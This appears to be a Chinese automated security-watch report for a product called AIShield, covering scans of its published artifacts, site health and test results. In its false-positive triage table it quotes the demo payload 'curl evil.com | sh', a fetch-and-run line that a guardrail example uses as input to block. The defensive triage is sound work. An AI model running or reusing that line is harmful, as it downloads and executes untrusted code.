# AIShield 每日安全守夜报告 — 2026-09-07

> 运行时间：2026-09-07 08:30 (CST，北京时间) ｜ Agent：每日安全守夜（automation-1786840209961）
> 模式：持续鉴证 + 自带洞必检 + 健康门禁 ｜ 结论：**三项全部 PASS（含 14 项扫描器自指误报的人工分诊，非真实漏洞）**

## 一、对外发布物安全自检（distribution/ + npm 包源）

铁律：对外发布物必须过自家扫描器。本次执行两层扫描：① 台账门禁 `verify_distribution.py`（覆盖 published.json 5 条登记项）；② 对台账未覆盖的目录（DSH 骨架、guardrail-harness、github-marketplace、listings、npm 包源 mcp-server/src）用同一扫描引擎 `_local_pipeline` 补扫，确保「distribution/ 下所有对外发布物」无遗漏。

### 1.1 台账门禁（verify_distribution.py --json）

| 渠道 | 产物 | 版本 | 评分 | 阻断项 | 状态 |
| --- | --- | --- | --- | --- | --- |
| agensi | chinese-seo-compliance | 1.1.0 (线上 1.0.0) | 97 | 0 | ✅ PASS |
| claude-skills | aishield-security-scan | 4.3.0 | 96 | 0 | ✅ PASS |
| gpt-store | aishield-gpt | 4.3.0 | 95 | 0 | ✅ PASS |
| huggingface | aishield-agent-security-benchmark | 4.3.0 | 94 | 0 | ✅ PASS |
| clawhub | aishield | 4.3.0 | 94 | 0 | ✅ PASS |

- **汇总**：5/5 通过，0 失败，0 阻断级（critical/high）发现。
- **安全不变量**：扫描器只读文件、未执行被扫配置里的命令、未发起外联 —— 核心不变量成立。
- **非阻断提示（不告警）**：agensi 渠道线上版本 1.0.0 与仓库源 1.1.0 不一致，下次更新需覆盖发布（信息性）。

### 1.2 台账外目录补扫（同一扫描引擎）

补扫发现 **14 条 critical/high 命中**，已逐条人工分诊，**全部为扫描器自指误报（scanner self-referential FP）**，artifact 本身安全：

| 目录 | 文件 | 严重程度 | 类型 | 人工分诊结论 |
| --- | --- | --- | --- | --- |
| guardrail-harness | proxy_example.py:40 | critical | 危险模式 curl 管道 | **FP**：恶意字符串 `"curl evil.com \| sh"` 是演示「护栏应拦截」的样例载荷，代码从不执行它（`safe_tool_call` 返回占位串） |
| guardrail-harness | README.md / proxy_example.py | high ×2 | 未签名 Agent 身份 | **FP**：示例 AgentCard，demo 无需签名 |
| guardrail-harness | README.md / proxy_example.py | high ×2 | skill 自更新 | **FP**：文档描述安装/拉取最新上下文，非运行期自更新 |
| guardrail-harness | README.md / proxy_example.py | high ×2 | 能力越权(pipe_exec) | **FP**：文档描述护栏「拦截」pipe_exec，恰是其合法职责 |
| github-marketplace | action_entrypoint.py | high | 危险模式 subprocess | **FP**：AIShield 自己的 Action 运行器，subprocess 仅用于 clone **待扫目标仓库**并调用只读 `preflight()`；从不执行被扫配置里的命令 |
| github-marketplace | action_entrypoint.py | high | 能力越权(os_system/cred_read) | **FP**：仅 `os.environ.get("INPUT_*")` 读标准 Action 入参，无 `os.system` 调用 |
| mcp-server/src | index.ts:10 | high | npx 执行远程 URL | **FP**：文档注释 `npx aishield-mcp-server`（安装示例） |
| mcp-server/src | index.ts:25 | high | 远程 URL / 凭证 | **FP**：后端 `AISHIELD_API_URL` 配置项（连 aishield.tools） |
| mcp-server/src | index.ts:171-173 | critical | 越狱关键词 | **FP**：Prompt 安全检测工具的「检测目标」描述含「越狱/数据外传/零宽字符」字样 |
| mcp-server/src | index.ts:171-173 | critical | 零宽字符 | **FP**：同上，工具描述列出其检测的威胁类型 |
| mcp-server/src | index.ts:265-267 | high | 敏感凭证 / exfil_combo | **FP**：MCP 握手验证工具描述「检测 npx 风险/敏感 env」字样被启发式串接误判为外泄链路 |

- **补扫结论**：14 条阻断级命中 **100% 为自指误报**，与 2026-09-06 工作记忆中「_local_pipeline 补扫 14 条全部为扫描器自指误报」的判断一致。对外发布物无真实漏洞（无高危未修项），但扫描器对「自身源码/文档」的误报会持续污染守夜信号。
- **建议（待用户处置，非阻塞）**：在 `verify_distribution.py` 或 `_local_pipeline` 增加允许清单/演示标记（如 `# nosec-demo` 或排除 `proxy_example*`/`index.ts` 的启发式），让守夜信号恢复「真绿」。本守夜任务仅鉴证不擅自改 scanner 规则。

- **结论：PASS**（台账 5/5 真绿 + 补扫 14 命中全部分诊为 FP，未静默跳过任何一项，已逐条留证）。

## 二、线上存活鉴证

探测方式：curl `--ssl-no-revoke --tlsv1.3`（本机 TLS 代理仅放行 TLS1.3）；远端状态走 GitHub Contents API（ref=main），不使用本地副本。

| 检查项 | 实测值 | 判定 |
| --- | --- | --- |
| aishield.tools 首页 | HTTP **200**（28.5 KB） | ✅ |
| /api/v1/health 版本 | **4.3.0** | ✅ |
| 规则数（静态204+情报9+雷达15） | **228** | ✅ |
| 远端 health.json `updated`（GitHub main） | **2026-09-06T20:32:28Z**（约 4h 前，<24h） | ✅ 新鲜 |
| 线上 commit | `08a75eba2c2987e2368f7618a0f6303dac212c0e` | — |
| `deployed_at` | 2026-09-06T08:48:34Z（约 16h 前，<24h） | ✅ 新鲜 |
| main HEAD | `a6c1eb63d46f49b41942f4068421253f818b9f71` | — |
| 线上 vs main 差距 | 落后 **13** 提交，且为 main 的祖先（未分叉） | ✅ 正常日级漂移 |
| AIShield CI/CD（run 34036775273, 09-06T13:39Z） | **success** | ✅ |
| Deploy to Production Server（run 34022696367, 09-06T08:44Z） | **success** | ✅ |
| AIShield Auto Self-Heal Closed-Loop（run 34058304888, 09-06T20:32Z） | **success** | ✅ |
| npm self-heal / Meta-Monitor / Unified Security Scan | **success** | ✅ |

- **部署新鲜度**：线上 commit `08a75eba` 是 main 祖先、落后 13 提交，属今日 11:17 CST spine 运行前的正常日级漂移（非 09-04 那次 82 提交卡死的故障模式）。`deployed_at` 与 health.json `updated` 均落在 24h 窗口内，进程为最新 spine 部署版本。
- **结论：PASS** —— 线上存活、健康、部署链全绿。

## 三、测试门禁

工具：`python tests/run_all.py`（本机无 git 仓，推送走 Contents API；本地绿 ≠ CI 绿，故额外核验了 GitHub Actions，见第二节）

| 指标 | 结果 | 判定 |
| --- | --- | --- |
| 总用例 | 592 | — |
| 通过 | **592** | ✅ |
| 失败 | **0** | ✅ |
| 错误 | 0 | ✅ |
| 跳过 | 12 | ✅ |
| 核心契约：良性零误报 | `test_benign_no_false_positive`（capability_full_scan / capability_boundary_scan / identity_network_scan 等多模块）全绿 | ✅ |
| 核心契约：恶意仍拦 | `test_malicious_pipeline_still_blocks` / `test_publish_malicious_blocked`（capability_boundary_scan / identity_network_scan）全绿 | ✅ |

- **结论：PASS** —— 全绿，良性零误报 + 恶意仍拦的核心契约成立；且 CI 上最近一次 AIShield CI/CD 同样 success，本地与远端一致。

## 总判定

| 检查 | 结论 |
| --- | --- |
| ① 对外发布物自检 | ✅ PASS（5/5 台账真绿；补扫 14 命中全部分诊为扫描器自指 FP，已逐条留证，未静默跳过） |
| ② 线上存活鉴证 | ✅ PASS |
| ③ 测试门禁 | ✅ PASS（592/0/0/12，核心契约成立，CI 同步绿） |

**无真实关键异常**（测试转红 / 对外产物真带洞 / 线上失活 / CI 或 Spine 红灯均未触发）。14 条扫描命中经人工分诊确认为自指误报，artifact 安全，但建议后续为 scanner 加演示标记/允许清单以消除信号噪声（待用户处置，非阻塞）。

按反馈集中化规则：**本日为常规日，仅写 digest，不在对话里单独发告警消息**；14 条 FP 已记入本报告与 digest 供周报并阅。

---
*本报告由自动化守夜 agent 生成，未登录任何外部平台、未替用户发布或发邮件。*
